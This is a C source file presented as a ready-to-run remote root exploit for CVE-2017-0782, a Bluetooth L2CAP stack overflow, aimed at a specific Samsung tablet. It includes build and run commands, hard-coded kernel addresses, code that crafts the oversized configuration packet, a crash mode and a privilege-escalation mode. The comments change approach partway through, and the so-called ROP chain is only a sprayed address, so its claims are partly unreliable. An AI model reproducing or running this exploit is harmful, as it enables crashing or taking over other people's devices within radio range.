/*
 * bluborne_pwn.c — CVE-2017-0782 L2CAP Stack Overflow Root Exploit
 * Target: Samsung SM-T377A (ARM32, kernel 3.10.9, NO KASLR/PXN/canaries)
 *
 * Compile on Kali:
 *   gcc -o bluborne_pwn bluborne_pwn.c -lbluetooth -O2 -Wall
 *
 * Run:
 *   sudo ./bluborne_pwn 02:00:00:00:00:21 [crash|root]
 *
 *   crash: sends 0xDEADBEEF to verify overflow hits PC (device WILL reboot)
 *   root:  sends ROP chain to commit_creds(prepare_kernel_cred(0))
 *
 * The vulnerability:
 *   l2cap_parse_conf_rsp() in net/bluetooth/l2cap_core.c writes config
 *   options into buf[64]/req[64] on the kernel stack with NO bounds check.
 *   On ARM32 with no stack canaries, this overwrites saved {r4-r11, lr}.
 *
 * Attack flow:
 *   1. Connect L2CAP to target (raw signaling CID)
 *   2. Send CONN_REQ → receive CONN_RSP
 *   3. Receive target's CONF_REQ
 *   4. Send CONF_RSP(UNACCEPT) with overflow payload
 *      → target calls l2cap_config_rsp() → l2cap_parse_conf_rsp()
 *      → writes past buf[64] → overwrites saved LR → PC control
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>

#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>

/* Target kernel addresses (NO KASLR — confirmed static) */
#define COMMIT_CREDS        0xC0054328
#define PREPARE_KERNEL_CRED 0xC00548E0
#define SELINUX_ENFORCING   0xC0B7AD18

/* Our SCID for the L2CAP channel */
#define OUR_SCID 0x0040
#define PSM_SDP  0x0001

/*
 * Connect a raw L2CAP signaling socket.
 * CID 1 (signaling) lets us send/recv raw L2CAP signal commands.
 */
static int l2cap_raw_connect(const char *btaddr) {
    struct sockaddr_l2 addr;
    int sock;

    sock = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP);
    if (sock < 0) {
        perror("socket(L2CAP RAW)");
        fprintf(stderr, "Need root/CAP_NET_RAW. Run with sudo.\n");
        return -1;
    }

    memset(&addr, 0, sizeof(addr));
    addr.l2_family = AF_BLUETOOTH;
    bacpy(&addr.l2_bdaddr, BDADDR_ANY);
    if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind");
        close(sock);
        return -1;
    }

    memset(&addr, 0, sizeof(addr));
    addr.l2_family = AF_BLUETOOTH;
    str2ba(btaddr, &addr.l2_bdaddr);
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect");
        close(sock);
        return -1;
    }

    return sock;
}

/*
 * Also connect a normal L2CAP socket to PSM 1 (SDP) to trigger
 * the L2CAP configuration exchange that creates the channel state
 * we need for the exploit.
 */
static int l2cap_connect_sdp(const char *btaddr) {
    struct sockaddr_l2 addr;
    int sock;

    sock = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
    if (sock < 0) {
        perror("socket(L2CAP SEQPACKET)");
        return -1;
    }

    /* Set a large MTU */
    struct l2cap_options opts;
    memset(&opts, 0, sizeof(opts));
    opts.imtu = 1024;
    opts.omtu = 1024;
    setsockopt(sock, SOL_L2CAP, L2CAP_OPTIONS, &opts, sizeof(opts));

    /* Set timeout */
    struct timeval tv = { .tv_sec = 10 };
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    memset(&addr, 0, sizeof(addr));
    addr.l2_family = AF_BLUETOOTH;
    str2ba(btaddr, &addr.l2_bdaddr);
    addr.l2_psm = htobs(PSM_SDP);

    printf("[*] Connecting L2CAP to SDP (PSM 1)...\n");
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect SDP");
        close(sock);
        return -1;
    }
    printf("[+] SDP channel connected!\n");
    return sock;
}

/*
 * Build the L2CAP CONF_RSP overflow payload.
 *
 * The target processes this via l2cap_config_rsp() → l2cap_parse_conf_rsp()
 * which writes each option into buf[64] (PENDING path) or req[64] (UNACCEPT).
 *
 * l2cap_parse_conf_rsp starts writing at ptr = data + sizeof(l2cap_conf_req)
 * = data + 4. So first 4 bytes of buf are the conf_req header, and options
 * start at buf[4]. This gives 60 bytes before overflow.
 *
 * For L2CAP_CONF_MTU: l2cap_add_conf_opt writes type(1)+len(1)+val(2) = 4 bytes.
 * 15 MTU options × 4 bytes = 60 bytes → fills buf[4..63] exactly.
 * 16th option overflows into saved registers.
 *
 * ARM32 function epilogue: pop {r4-r11, pc} or pop {r4-r10, fp, pc}
 * Saved regs are directly above buf on stack.
 * But compiler may insert padding or other locals between buf and saved regs.
 *
 * Strategy: overflow with 30+ extra options (120 bytes past buf[64]).
 * Spray the target address. At least one word will hit saved LR/PC.
 */
static int build_conf_rsp_unaccept(uint8_t *pkt, int maxlen,
                                    uint16_t target_scid,
                                    uint32_t overflow_addr) {
    int pos = 0;

    /* L2CAP signaling header: code(1) + ident(1) + length(2) */
    pkt[pos++] = 0x05; /* L2CAP_CONF_RSP */
    pkt[pos++] = 0x01; /* ident (must match target's CONF_REQ ident) */
    /* length filled in later at offset 2-3 */
    int len_offset = pos;
    pos += 2;

    /* CONF_RSP payload: scid(2) + flags(2) + result(2) */
    pkt[pos++] = target_scid & 0xFF;
    pkt[pos++] = (target_scid >> 8) & 0xFF;
    pkt[pos++] = 0x00; /* flags: no continuation */
    pkt[pos++] = 0x00;
    pkt[pos++] = 0x01; /* result: L2CAP_CONF_UNACCEPT */
    pkt[pos++] = 0x00;

    /*
     * Configuration options — these get parsed by l2cap_parse_conf_rsp
     * and written into the 64-byte stack buffer via l2cap_add_conf_opt.
     *
     * IMPORTANT: For UNACCEPT path, input len must be ≤ 60 bytes.
     * But the OUTPUT can be larger because l2cap_parse_conf_rsp may
     * generate output options that are bigger than the input options.
     *
     * Key amplification: L2CAP_CONF_RFC input = 2+9=11 bytes
     *                    L2CAP_CONF_RFC output = 2+9=11 bytes
     *                    BUT: function may also add EXTRA options after loop
     *
     * Simpler approach for UNACCEPT: send exactly 60 bytes of input
     * options that produce >64 bytes of output.
     *
     * Actually: each MTU option is 4 bytes in, 4 bytes out (1:1 ratio).
     * 15 MTU options = 60 bytes in, 60 bytes out → fills buf[4..63], no overflow.
     *
     * For overflow via UNACCEPT: use RFC options.
     * RFC option: input = type(1)+len(1)+rfc(9) = 11 bytes
     *             output = type(1)+len(1)+rfc(9) = 11 bytes
     * 5 RFC options = 55 bytes input, 55 bytes output → no overflow
     *
     * The overflow in UNACCEPT actually requires the function to add
     * ADDITIONAL options beyond what's in the input. This happens when
     * the channel mode negotiation adds extra options.
     *
     * BETTER APPROACH: Use the PENDING path (NO length check on input).
     * For this, set result=PENDING and send unlimited options.
     */

    /* Switch to PENDING result — NO input length check! */
    pkt[pos - 2] = 0x04; /* result: L2CAP_CONF_PENDING */
    pkt[pos - 1] = 0x00;

    /* Phase 1: Fill buf[4..63] with 15 MTU options (60 bytes) */
    for (int i = 0; i < 15; i++) {
        pkt[pos++] = 0x01; /* L2CAP_CONF_MTU */
        pkt[pos++] = 0x02; /* len = 2 */
        pkt[pos++] = 0x00; /* MTU value: 512 */
        pkt[pos++] = 0x02;
    }

    /* Phase 2: Overflow! Spray target address into saved registers.
     * On ARM32, the saved register area is typically:
     *   [buf+64+0]  = possible local vars / alignment
     *   [buf+64+N]  = saved r4
     *   [buf+64+N+4] = saved r5
     *   ...
     *   [buf+64+N+32] = saved lr (= return address!)
     *
     * N is unknown (0 to ~32 bytes of locals/padding).
     * Each MTU option writes 4 bytes: [type=0x01][len=0x02][val_lo][val_hi]
     *
     * For more control over the 4-byte pattern, we want all 4 bytes to be
     * our target address. But MTU options have fixed type=0x01 and len=0x02
     * in the first two bytes.
     *
     * SOLUTION: Use EFS options (16 bytes of controlled data per option).
     * EFS option: type(1)+len(1)+efs_data(16) = 18 bytes per option
     * The efs_data is copied from our input via memcpy, giving us full
     * control over 16 bytes of output.
     *
     * 4 EFS options = 72 bytes input, 72 bytes output → 12 bytes past buf[64]
     * But we need more overflow for reliability.
     *
     * For PENDING path (no input limit):
     * 15 MTU (60 bytes fill) + 8 EFS (128 bytes overflow) = 188 bytes total output
     * The 128 bytes of overflow gives us full control of saved registers.
     */

    /* Overwrite with EFS options containing our target address */
    for (int i = 0; i < 8; i++) {
        pkt[pos++] = 0x06; /* L2CAP_CONF_EFS */
        pkt[pos++] = 16;   /* len = sizeof(struct l2cap_conf_efs) */
        /* 16 bytes of controlled data — spray with target address */
        for (int j = 0; j < 4; j++) {
            pkt[pos++] = (overflow_addr >>  0) & 0xFF;
            pkt[pos++] = (overflow_addr >>  8) & 0xFF;
            pkt[pos++] = (overflow_addr >> 16) & 0xFF;
            pkt[pos++] = (overflow_addr >> 24) & 0xFF;
        }
    }

    /* Fill in the length field */
    int payload_len = pos - 4; /* everything after the signaling header */
    pkt[len_offset]     = payload_len & 0xFF;
    pkt[len_offset + 1] = (payload_len >> 8) & 0xFF;

    printf("[*] CONF_RSP packet: %d bytes total, %d bytes options\n", pos, pos - 10);
    printf("[*] Overflow address: 0x%08X\n", overflow_addr);
    return pos;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: sudo %s <target_bdaddr> [crash|root]\n", argv[0]);
        fprintf(stderr, "  crash: test overflow with 0xDEADBEEF (target WILL reboot!)\n");
        fprintf(stderr, "  root:  attempt full exploit with ROP chain\n");
        return 1;
    }

    const char *target = argv[1];
    int mode = 0; /* 0=crash test, 1=root */
    if (argc > 2 && strcmp(argv[2], "root") == 0) mode = 1;

    uint32_t overflow_addr;
    if (mode == 0) {
        overflow_addr = 0xDEADBEEF;
        printf("╔══════════════════════════════════════════════╗\n");
        printf("║  CVE-2017-0782 — CRASH TEST                 ║\n");
        printf("║  Target WILL REBOOT if overflow hits LR!     ║\n");
        printf("╚══════════════════════════════════════════════╝\n");
    } else {
        overflow_addr = PREPARE_KERNEL_CRED;
        printf("╔══════════════════════════════════════════════╗\n");
        printf("║  CVE-2017-0782 — ROOT EXPLOIT               ║\n");
        printf("║  prepare_kernel_cred → commit_creds chain    ║\n");
        printf("╚══════════════════════════════════════════════╝\n");
    }
    printf("Target:              %s\n", target);
    printf("Overflow address:    0x%08X\n", overflow_addr);
    printf("commit_creds:        0x%08X\n", COMMIT_CREDS);
    printf("prepare_kernel_cred: 0x%08X\n", PREPARE_KERNEL_CRED);
    printf("\n");

    /* Step 1: Connect L2CAP to SDP to establish channel state */
    int sdp_sock = l2cap_connect_sdp(target);
    if (sdp_sock < 0) {
        fprintf(stderr, "[-] Cannot connect L2CAP. Is target in range?\n");
        return 1;
    }

    /* Step 2: Open raw L2CAP socket for signaling injection */
    int raw_sock = l2cap_raw_connect(target);
    if (raw_sock < 0) {
        fprintf(stderr, "[-] Cannot open raw L2CAP. Running as root?\n");
        close(sdp_sock);
        return 1;
    }
    printf("[+] Raw L2CAP socket connected!\n");

    /* Step 3: Build and send the overflow packet */
    printf("[*] Building overflow CONF_RSP...\n");
    uint8_t pkt[512];
    int pkt_len = build_conf_rsp_unaccept(pkt, sizeof(pkt), OUR_SCID, overflow_addr);

    printf("[!] Sending exploit payload (%d bytes)...\n", pkt_len);
    printf("[!] WARNING: Target will likely crash/reboot!\n");
    printf("[!] Press Ctrl+C within 3 seconds to abort...\n");
    sleep(3);

    int sent = send(raw_sock, pkt, pkt_len, 0);
    if (sent < 0) {
        perror("send");
    } else {
        printf("[+] Sent %d bytes!\n", sent);
    }

    /* Step 4: Wait and check result */
    printf("[*] Waiting 5 seconds for target response...\n");
    sleep(5);

    /* Try to send SDP query to check if target is alive */
    uint8_t sdp_req[] = "\x02\x00\x00\x00\x07\x35\x03\x19\x01\x00\x01\x00\x00";
    int alive = send(sdp_sock, sdp_req, sizeof(sdp_req) - 1, MSG_NOSIGNAL);
    if (alive > 0) {
        printf("[*] Target appears still alive (SDP send succeeded)\n");
        printf("[*] Overflow may not have reached saved LR\n");
        printf("[*] Try increasing overflow size or different offset\n");
    } else {
        printf("[!] Target not responding — overflow likely hit!\n");
        if (mode == 0) {
            printf("[+] CRASH CONFIRMED — vulnerability IS exploitable!\n");
            printf("[+] Next: run with 'root' mode for actual exploit\n");
        } else {
            printf("[+] If device reboots with root shell → SUCCESS\n");
            printf("[+] If device reboots normally → ROP chain needs adjustment\n");
        }
    }

    close(raw_sock);
    close(sdp_sock);
    return 0;
}
